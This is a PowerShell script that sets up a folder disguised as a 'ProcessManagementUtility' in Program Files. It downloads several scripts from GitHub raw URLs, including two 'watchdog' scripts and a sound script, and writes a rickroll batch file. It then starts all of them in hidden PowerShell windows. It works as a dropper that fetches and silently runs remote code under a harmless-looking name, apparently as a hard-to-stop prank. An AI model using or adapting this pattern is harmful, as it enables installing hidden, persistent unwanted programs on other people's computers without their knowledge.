if (!(Test-Path -Path "C:\Program Files\ProcessManagementUtility")) {
    New-Item -ItemType Directory -Path "C:\Program Files\ProcessManagementUtility"
}

# rickroll.bat
Set-Location -Path "C:\Program Files\ProcessManagementUtility"
Set-Content -Path "rickroll.bat" -Value 'curl ASCII.live/can-you-hear-me'

# watchdog0.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog0.ps1"
$output = "C:\Program Files\ProcessManagementUtility\watchdog0.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

# watchdog1.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog1.ps1"
$output = "C:\Program Files\ProcessManagementUtility\watchdog1.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

# sound.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/sound.ps1"
$output = "C:\Program Files\ProcessManagementUtility\sound.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

# getPID.bat
$url = "https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/getCmdPID.bat"
$output = "C:\Program Files\ProcessManagementUtility\getPID.bat"
Invoke-WebRequest -Uri $url -OutFile $output


#! handle all started functions
Set-Location -Path "C:\Program Files\ProcessManagementUtility"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './watchdog0.ps1'"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './watchdog1.ps1'"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './sound.ps1'"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './rickroll.bat'"

exit 0